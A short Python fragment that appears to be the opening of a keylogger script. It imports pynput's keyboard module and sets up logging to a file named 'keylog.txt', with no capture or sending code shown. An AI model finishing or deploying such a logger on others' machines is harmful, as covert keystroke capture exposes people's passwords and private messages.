from pynput import keyboard
import logging
import datetime


logging.basicConfig(
    filename="keylog.txt",
    level = logging.DEBUG,
    format = "%(asctime)s - %(message)s"
)
